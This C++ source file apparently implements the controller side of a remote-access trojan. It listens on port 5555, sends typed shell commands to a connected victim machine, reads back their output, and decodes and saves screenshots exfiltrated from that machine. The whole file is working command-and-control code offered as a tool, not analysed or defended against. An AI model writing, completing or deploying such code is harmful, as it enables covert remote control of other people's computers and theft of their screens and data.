#include <iostream>
#include "TCPServer.h"
#include "base64.h"

using namespace std;

int main() {

    TCPServer *server = new TCPServer(5555);

    if (!server->bindSocket()) return -1;
    if (!server->listenSocket()) return -1;

    int clientSocket = server->acceptConnection();

    // string to append
    const char *endMarker = " & echo ### END OF OUTPUT ###";


    char sendBuffer[200] = "\n";
    char receiveBuffer[4096] = "\n";
    int byteCount = 0;

    char quitCommand[200];
    strcpy(quitCommand, "quit");
    strncat(quitCommand, endMarker, sizeof(quitCommand) - strlen(quitCommand) - 1);


    if (clientSocket >= 0) {

        cout << "\033[31m" << "Enter your command: " << "\033[0m";
        cin.getline(sendBuffer, 200);

        // calculate how much space is left
        size_t len = strlen(sendBuffer);
        size_t remaining = 200 - len - 1; // leave space for null terminator

        // append safely
        strncat(sendBuffer, endMarker, remaining);

        // Write/read loop to clientSocket
        while (strcmp(sendBuffer, quitCommand) != 0) {

            //SEND
            byteCount = send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
            if (byteCount < 0) {
                cout << "Server: error sending data" << endl;
                return -1;
            } else {
                cout << "Server: sent " << byteCount << " bytes" << endl;
            }

            //RECEIVE
            byteCount = recv(clientSocket, receiveBuffer, 4096, 0);
            if (byteCount <= 0) {
                cout << "Server: error receiving data or connection closed" << endl;
                return -1;
            } else {
        //         receiveBuffer[byteCount] = '\0';

        //         cout << "Received data from "
        //   << server->getClientIP() << ":"
        //   << server->getClientPort()
        //   << " : " << "\033[32m" << receiveBuffer << "\033[0m" << endl;
                if (strncmp(sendBuffer, "screenshot", 10) == 0) {
                    std::string base64Data(receiveBuffer);
                    std::vector<unsigned char> imageData = base64_decode(base64Data);

                    std::ofstream outFile("received_screenshot.bmp", std::ios::binary);
                    outFile.write(reinterpret_cast<const char*>(imageData.data()), imageData.size());
                    outFile.close();

                    cout << "Screenshot saved as received_screenshot.bmp" << endl;
                } else {
                    cout << "Received data from "
                        << server->getClientIP() << ":"
                        << server->getClientPort()
                        << " : " << "\033[32m" << receiveBuffer << "\033[0m" << endl;
                }
            }

            //PROMPT FOR COMMAND AGAIN
            cout << "\033[31m" << "Enter your command: " << "\033[0m";
            cin.getline(sendBuffer, 200);
            size_t len = strlen(sendBuffer);
            size_t remaining = 200 - len - 1; // leave space for null terminator
            strncat(sendBuffer, endMarker, remaining);
        }
        
        shutdown(clientSocket, SHUT_RDWR);
        close(clientSocket);
    }

    // serverSocket will be closed in the destructor
    return 0;

}